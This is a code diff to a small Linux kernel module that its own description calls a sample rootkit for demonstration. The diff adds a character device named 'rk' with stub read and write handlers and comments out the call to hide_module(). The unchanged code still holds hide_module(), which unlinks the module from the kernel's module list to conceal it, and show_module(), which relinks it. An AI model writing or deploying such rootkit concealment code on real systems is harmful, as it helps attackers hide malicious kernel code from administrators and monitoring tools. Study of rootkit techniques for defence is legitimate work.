@@ -11,18 +11,63 @@
 #include <linux/cred.h>
 #include <linux/version.h>
 
+#define DEVICE_NAME "rk"
+#define CLASS_NAME "rk"
+
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tyler Riedal<riedalsolutions@gmail.com>");
-MODULE_DESCRIPTION("Sample roootkit implementation for demonstrative purposes.");
+MODULE_DESCRIPTION("Sample rootkit implementation for demonstrative purposes.");
+
+static int major_number;
+static struct class *char_class;
+static struct device *char_device;
 
 static int module_hidden = 0;
 
 static struct list_head *prev_mod;
 static struct list_head *prev_kobj;
 
+// Char driver prototypes
+static int     device_open(struct inode *, struct file *);
+static int     device_release(struct inode *, struct file *);
+static ssize_t device_read(struct file *, char *, size_t, loff_t *);
+static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
+
+static struct file_operations fops =
+{
+   .open = device_open,
+   .read = device_read,
+   .write = device_write,
+   .release = device_release,
+};
+
+static int device_open(struct inode *inodep, struct file *filep)
+{
+    return 0;
+}
+
+// Writes data to userland
+static ssize_t device_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
+{
+    return len;
+}
+
+// Receives data from userland
+static ssize_t device_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
+{
+    return len;
+}
+
+
+static int device_release(struct inode *inodep, struct file *filep)
+{
+    return 0;
+}
+
 void hide_module(void)
 {
-    if (module_hidden) return;
+    if (module_hidden)
+        return;
     
     // Store addr of module for use when unhiding
     prev_mod = THIS_MODULE->list.prev;
@@ -40,20 +85,52 @@ void hide_module(void)
 
 void show_module(void)
 {
-    if (!module_hidden) return;
+    if (!module_hidden)
+        return;
+        
     list_add(&THIS_MODULE->list, prev_mod);
     module_hidden = !module_hidden;
 }
 
 static int __init init_mod(void)
-{
+{    
+    // Dynamically allocate major device number
+    if ((major_number = register_chrdev(0, DEVICE_NAME, &fops)) < 0) {
+        printk(KERN_ERR "rk: Failed to register a major number.\n");
+        return major_number;
+    }
+    printk(KERN_INFO "rk: Device major number is %d.\n", major_number);
+    
+    // Register device class
+    char_class = class_create(THIS_MODULE, CLASS_NAME);
+    if (IS_ERR(char_class)) {
+        unregister_chrdev(major_number, DEVICE_NAME);
+        printk(KERN_ERR "rk: Failed to register device class.\n");
+        return PTR_ERR(char_class);
+    }
+    printk(KERN_INFO "rk: Device class registered.\n");
+    
+    // Register device driver
+    char_device = device_create(char_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
+    if (IS_ERR(char_device)) {
+        class_destroy(char_class);
+        unregister_chrdev(major_number, DEVICE_NAME);
+        printk(KERN_ERR "rk: Failed to register device driver.\n");
+        return PTR_ERR(char_device);
+    }
+    printk(KERN_INFO "rk: Device driver registered.\n");
+        
     printk(KERN_INFO "rk: Module initialized.\n");
-    hide_module();
+    // hide_module();
 	return 0;
 }
 
 static void __exit exit_mod(void)
 {
+    device_destroy(char_class, MKDEV(major_number, 0));
+    class_unregister(char_class);
+    class_destroy(char_class);
+    unregister_chrdev(major_number, DEVICE_NAME);
     printk(KERN_INFO "rk: Module removed.\n");
 }
 
